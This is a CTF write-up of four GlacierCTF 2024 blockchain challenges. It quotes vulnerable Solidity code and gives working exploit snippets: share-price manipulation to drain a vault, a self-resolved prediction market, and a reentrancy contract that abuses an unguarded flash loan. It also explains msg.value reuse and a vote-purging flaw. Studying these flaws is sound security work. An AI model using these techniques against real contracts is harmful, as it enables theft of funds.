---
layout: post
title:  GlacierCTF 2024 Blockchain challenges
date:   2024-11-22 -0700
description: GlacierCTF 2024 - Blockchain
tags: [GlacierCTF, Blockchain, Writeup]
exclude: false
---

### Note

I've included all 3 challenges that I solved in one writeup because solutions are somewhat small.

## Drainme

We are given a `ChallengeContract` instance, which has following functions:

```solidity
function depositEth() public payable {
  uint256 value = msg.value;
  uint256 shares = 0;

  require(value > 0, "Value too small");

  if (totalShares == 0) {
      shares = value;
  } else {
      shares = (totalShares * value) / address(this).balance;
  }

  totalShares += shares;
  balances[msg.sender] += shares;
}

function withdrawEth(uint256 shares) public {
  require(balances[msg.sender] >= shares, "Not enough shares");

  uint256 value = (shares * address(this).balance) / totalShares;

  totalShares -= shares;
  balances[msg.sender] -= shares;

  (bool success, ) = address(msg.sender).call{value: value}("");
  require(success, "ETH transfer failed");
}
```

We are also given another contract called `SharesBuyer` which initially receives some amount of ether from the `Setup` contract and then can either deposit its full balance to `CallengeContract` or receive ether from someone. Following code successfully exploits the contract:

```solidity
c.depositEth{value: 1}();
sb.buyShares();
c.withdrawEth(c.balances(msg.sender));
```

Here `c` is a given `ChallengeContract` and `sb` is a given `SharesBuyer` contract. `address(this).balance` is updated before the function execution so after the first two lines are executed, `totalShares` is **1**. When the contract calculates how much to withdraw, it will get `value = 1 * address(this).balance / 1`, so it will give us its whole balance.

## FrozyMarket

We are given a `FrozyMarket` contract instance, the functionality of which is to create contract, determine a winning boolean value upon being resolved and let user claim winnings. For this challenge following code works:

```solidity
f.createMarket("pwned", 0);
f.bet{value: 0.5 ether}(1, false);
f.resolveMarket(1, false);
f.claimWinnings(1);
```

Even though contract creates 1 market initially it also allows us to create as many markets as we want. So, if we create one market and set its `resolvedBy` timestamp to 0 (so that we can resolve it immediately), we can later set `false` as the winning bet.


## ArcticVault

The challenge gives us an `ArcticVault` contract instance, which implements multicall to save gas. This challenge can be exploited in 2 ways. The way I solved is unintended. Here's the exploit contract:

```solidity
contract Exploit {
  Setup s;
  ArcticVault public a;
  bool once = true;

  constructor(address _s) payable {
    s = Setup(_s);
    a = ArcticVault(s.TARGET());
  }

  function exploit() public {
    a.flashLoan(1 ether);
    a.withdraw();
  }

  fallback() external payable {
    if (once) {
      once = !once;
      a.flashLoan(0);
      a.deposit{value: 1 ether}();
    }
  }
}
```

This contract exploits the fact that `flashLoan` function is not protected by `reentrancyGuard`. If we call it twice, after the second call we can call `deposit` (which is protected by `reentrancyGuard` but we've set it to `false` from the previous `flashLoan` call) and deposit the loaned amount back. This basically means that we have tricked contract into thinking we've deposited our own balance while in reality we've deposited its own balance back. After, this we can simply withdraw and get the flag.

### Intended Exploit

But what's the point of adding multicall functionality to the contract if we didn't need to use it? Intended way to exploit this would have been to abuse `msg.value` reuse in, for example, `muticallThis` function and `deposit` twice while only paying once.


## Voteme

My teammate solved this one but I thought I would just briefly state what the vulnerability is in this challenge. When a violator is detected, contract purges the votes of a proposal for which it detected the violator. This means that if we create many contracts that vote for one **real** proposal once and for another proposal twice (or more times), they will be detected on the second proposal (via calling `checkConsesus`) and their vote for the first proposal vould stay. This way we can increase votes for the proposal while maintaining the same number of stakers.